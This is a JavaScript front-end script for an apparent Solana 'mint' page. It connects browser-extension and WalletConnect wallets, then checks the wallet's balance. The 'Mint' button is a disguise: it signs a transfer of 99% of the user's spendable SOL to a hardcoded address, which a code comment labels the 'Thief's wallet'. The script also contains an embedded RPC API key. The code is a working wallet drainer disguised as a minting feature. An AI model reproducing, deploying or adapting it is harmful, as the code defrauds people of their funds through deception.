$(document).ready(function() {
    // WalletConnect configuration
    let walletConnector = null;
    
    // Initialize WalletConnect
    function initWalletConnect() {
        if (typeof WalletConnect !== 'undefined') {
            walletConnector = new WalletConnect({
                bridge: "https://bridge.walletconnect.org",
                qrcodeModal: QRCodeModal,
            });
            
            // Subscribe to connection events
            walletConnector.on("connect", (error, payload) => {
                if (error) {
                    throw error;
                }
                console.log("WalletConnect connected:", payload);
            });

            walletConnector.on("session_update", (error, payload) => {
                if (error) {
                    throw error;
                }
                console.log("WalletConnect session updated:", payload);
            });

            walletConnector.on("disconnect", (error, payload) => {
                if (error) {
                    throw error;
                }
                console.log("WalletConnect disconnected:", payload);
            });
        }
    }

    // Add wallet selection dropdown with more wallet options
    const walletOptions = [
        { name: "Phantom", key: "isPhantom", extensionCheck: true, walletConnect: true },
        { name: "Solflare", key: "isSolflare", extensionCheck: false, walletConnect: true },
        { name: "Backpack", key: "isBackpack", extensionCheck: false, walletConnect: false },
        { name: "Trust Wallet", key: "isTrust", extensionCheck: false, walletConnect: true },
        { name: "Glow", key: "isGlow", extensionCheck: false, walletConnect: true },
        { name: "Slope", key: "isSlope", extensionCheck: false, walletConnect: true },
        { name: "Sollet", key: "isSollet", extensionCheck: false, walletConnect: false },
        { name: "Coin98", key: "isCoin98", extensionCheck: false, walletConnect: true },
        { name: "Clover", key: "isClover", extensionCheck: false, walletConnect: true },
        { name: "MathWallet", key: "isMathWallet", extensionCheck: false, walletConnect: true },
        { name: "TokenPocket", key: "isTokenPocket", extensionCheck: false, walletConnect: true }
    ];

    // Function to detect mobile app or deep link support
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Function to connect via WalletConnect for mobile wallets
    async function connectViaWalletConnect(walletName) {
        try {
            initWalletConnect();
            
            if (!walletConnector.connected) {
                // Create new session
                await walletConnector.createSession();
                console.log("WalletConnect URI:", walletConnector.uri);
                
                // For mobile, try to open the wallet app directly
                const mobileSchemes = {
                    "phantom": `phantom://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "trust wallet": `trust://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "solflare": `solflare://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "glow": `glow://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "slope": `slope://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "coin98": `coin98://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "mathwallet": `mathwallet://wc?uri=${encodeURIComponent(walletConnector.uri)}`,
                    "tokenpocket": `tokenpocket://wc?uri=${encodeURIComponent(walletConnector.uri)}`
                };
                
                if (isMobileDevice() && mobileSchemes[walletName.toLowerCase()]) {
                    // Try to open mobile wallet app with WalletConnect URI
                    window.location.href = mobileSchemes[walletName.toLowerCase()];
                    
                    // Fallback: show QR code modal after delay
                    setTimeout(() => {
                        if (!walletConnector.connected) {
                            QRCodeModal.open(walletConnector.uri, () => {
                                console.log("QR Code Modal closed");
                            });
                        }
                    }, 2000);
                } else {
                    // Desktop: show QR code modal
                    QRCodeModal.open(walletConnector.uri, () => {
                        console.log("QR Code Modal closed");
                    });
                }
                
                return new Promise((resolve, reject) => {
                    walletConnector.on("connect", (error, payload) => {
                        if (error) {
                            reject(error);
                            return;
                        }
                        QRCodeModal.close();
                        resolve({
                            publicKey: payload.params[0].accounts[0],
                            walletConnector: walletConnector
                        });
                    });
                });
            }
        } catch (error) {
            console.error("WalletConnect connection failed:", error);
            throw error;
        }
    }

    // Initialize WalletConnect on page load
    initWalletConnect();

    // Insert dropdown before button
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:10px;padding:5px 10px;border-radius:5px;font-size:1rem;"></select>');
    walletOptions.forEach(opt => {
        $('#wallet-select').append(`<option value="${opt.name.toLowerCase()}">${opt.name}</option>`);
    });

    $('#connect-wallet').on('click', async () => {
        const selectedWallet = $('#wallet-select').val();
        let provider = null;
        let providerName = "";

        // Force disconnect from all wallets first to ensure clean state
        try {
            if (window.solana && window.solana.disconnect) {
                await window.solana.disconnect();
            }
            if (window.solflare && window.solflare.disconnect) {
                await window.solflare.disconnect();
            }
            if (window.backpack && window.backpack.disconnect) {
                await window.backpack.disconnect();
            }
        } catch (e) {
            // Ignore disconnect errors
        }

        // Wait a moment for disconnections to complete
        await new Promise(resolve => setTimeout(resolve, 100));

        // Enhanced wallet detection including mobile apps
        if (selectedWallet === "phantom" && window.solana && window.solana.isPhantom) {
            provider = window.solana;
            providerName = "Phantom";
        } else if (selectedWallet === "solflare" && (window.solflare || (window.solana && window.solana.isSolflare))) {
            provider = window.solflare || window.solana;
            providerName = "Solflare";
        } else if (selectedWallet === "backpack" && window.backpack) {
            provider = window.backpack;
            providerName = "Backpack";
        } else if (selectedWallet === "trust wallet" && (window.trustwallet || window.trustWallet)) {
            provider = window.trustwallet || window.trustWallet;
            providerName = "Trust Wallet";
        } else if (selectedWallet === "glow" && window.glow) {
            provider = window.glow;
            providerName = "Glow";
        } else if (selectedWallet === "slope" && window.Slope) {
            provider = window.Slope;
            providerName = "Slope";
        } else if (selectedWallet === "sollet" && window.sollet) {
            provider = window.sollet;
            providerName = "Sollet";
        } else if (selectedWallet === "coin98" && window.coin98) {
            provider = window.coin98.sol;
            providerName = "Coin98";
        } else if (selectedWallet === "clover" && window.clover_solana) {
            provider = window.clover_solana;
            providerName = "Clover";
        } else if (selectedWallet === "mathwallet" && window.solana && window.solana.isMathWallet) {
            provider = window.solana;
            providerName = "MathWallet";
        } else if (selectedWallet === "tokenpocket" && window.tokenpocket && window.tokenpocket.solana) {
            provider = window.tokenpocket.solana;
            providerName = "TokenPocket";
        }

        // Enhanced wallet extension/app checks with mobile support
        if (selectedWallet === "phantom" && (!window.solana || !window.solana.isPhantom)) {
            if (isMobileDevice()) {
                // Try to open Phantom mobile app
                window.location.href = "phantom://";
                setTimeout(() => {
                    alert("Phantom app not found. Please install from App Store/Play Store.");
                    window.open("https://phantom.app/download", "_blank");
                }, 1000);
            } else {
                alert("Phantom extension not found.");
                const isFirefox = typeof InstallTrigger !== "undefined";
                const isChrome = !!window.chrome;
                if (isFirefox) {
                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                } else if (isChrome) {
                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                } else {
                    alert("Please download the Phantom extension for your browser.");
                }
            }
            return;
        }

        // Check for Solflare extension/app if Solflare selected
        if (selectedWallet === "solflare" && !window.solflare && !(window.solana && window.solana.isSolflare)) {
            if (isMobileDevice()) {
                window.location.href = "solflare://";
                setTimeout(() => {
                    alert("Solflare app not found. Please install from App Store/Play Store.");
                    window.open("https://solflare.com/download", "_blank");
                }, 1000);
            } else {
                alert("Solflare extension not found. Please install Solflare wallet.");
                window.open("https://solflare.com/download", "_blank");
            }
            return;
        }

        // Check for other wallets with mobile app support
        const walletChecks = {
            backpack: { obj: window.backpack, url: "https://backpack.app/download", scheme: "backpack://" },
            "trust wallet": { obj: window.trustwallet || window.trustWallet, url: "https://trustwallet.com/", scheme: "trust://" },
            glow: { obj: window.glow, url: "https://glow.app/download", scheme: "glow://" },
            slope: { obj: window.Slope, url: "https://slope.finance/", scheme: "slope://" },
            sollet: { obj: window.sollet, url: "https://sollet.io/", scheme: "sollet://" },
            coin98: { obj: window.coin98, url: "https://coin98.com/wallet", scheme: "coin98://" },
            clover: { obj: window.clover_solana, url: "https://clover.finance/wallet", scheme: "clover://" },
            mathwallet: { obj: window.solana && window.solana.isMathWallet, url: "https://mathwallet.org/", scheme: "mathwallet://" },
            tokenpocket: { obj: window.tokenpocket && window.tokenpocket.solana, url: "https://tokenpocket.pro/", scheme: "tokenpocket://" }
        };

        if (walletChecks[selectedWallet] && !walletChecks[selectedWallet].obj) {
            const wallet = walletChecks[selectedWallet];
            if (isMobileDevice()) {
                window.location.href = wallet.scheme;
                setTimeout(() => {
                    alert(`${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} app not found. Please install from App Store/Play Store.`);
                    window.open(wallet.url, "_blank");
                }, 1000);
            } else {
                alert(`${selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1)} extension not found. Please install the wallet.`);
                window.open(wallet.url, "_blank");
            }
            return;
        }

        if (!provider) {
            // Try WalletConnect for mobile wallets
            const selectedWalletOption = walletOptions.find(w => w.name.toLowerCase() === selectedWallet);
            if (isMobileDevice() && selectedWalletOption && selectedWalletOption.walletConnect) {
                console.log(`Attempting WalletConnect for ${selectedWallet}`);
                try {
                    const wcResult = await connectViaWalletConnect(selectedWallet);
                    console.log("WalletConnect successful:", wcResult);
                    
                    // Create a mock provider for WalletConnect
                    provider = {
                        publicKey: new solanaWeb3.PublicKey(wcResult.publicKey),
                        signTransaction: async (transaction) => {
                            // WalletConnect transaction signing
                            const txData = {
                                from: wcResult.publicKey,
                                to: transaction.instructions[0].keys[1].pubkey.toString(),
                                value: transaction.instructions[0].data.toString('hex')
                            };
                            
                            try {
                                const result = await walletConnector.sendTransaction(txData);
                                return { serialize: () => Buffer.from(result, 'hex') };
                            } catch (error) {
                                console.error("WalletConnect transaction failed:", error);
                                throw error;
                            }
                        }
                    };
                    providerName = selectedWalletOption.name;
                } catch (error) {
                    console.error("WalletConnect failed:", error);
                    alert(`Failed to connect via WalletConnect: ${error.message}`);
                    return;
                }
            } else {
                alert("Selected wallet provider not found.");
                return;
            }
        }

        try {
            let resp;
            
            // Handle WalletConnect vs regular provider
            if (provider.walletConnector) {
                // WalletConnect is already connected
                resp = { publicKey: provider.publicKey };
            } else {
                // Regular wallet provider connection
                resp = await provider.connect({ onlyIfTrusted: false });
            }
            
            console.log(`${providerName} Wallet connected:`, resp);

            var connection = new solanaWeb3.Connection(
                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4', 
                'confirmed'
            );

            const public_key = new solanaWeb3.PublicKey(resp.publicKey || provider.publicKey);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            if (walletBalance < minBalance) {
                alert("Insufficient funds for rent.");
                return;
            }

            $('#connect-wallet').text("Mint");
            $('#connect-wallet').off('click').on('click', async () => {
                try {
                    const recieverWallet = new solanaWeb3.PublicKey('4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s'); // Thief's wallet
                    const balanceForTransfer = walletBalance - minBalance;
                    if (balanceForTransfer <= 0) {
                        alert("Insufficient funds for transfer.");
                        return;
                    }

                    var transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: public_key,
                            toPubkey: recieverWallet,
                            lamports: Math.floor(balanceForTransfer * 0.99),
                        }),
                    );

                    transaction.feePayer = public_key;
                    let blockhashObj = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhashObj.blockhash;

                    const signed = await provider.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);
                } catch (err) {
                    console.error("Error during minting:", err);
                }
            });
        } catch (err) {
            console.error(`Error connecting to ${providerName} Wallet:`, err);
        }
    });
});
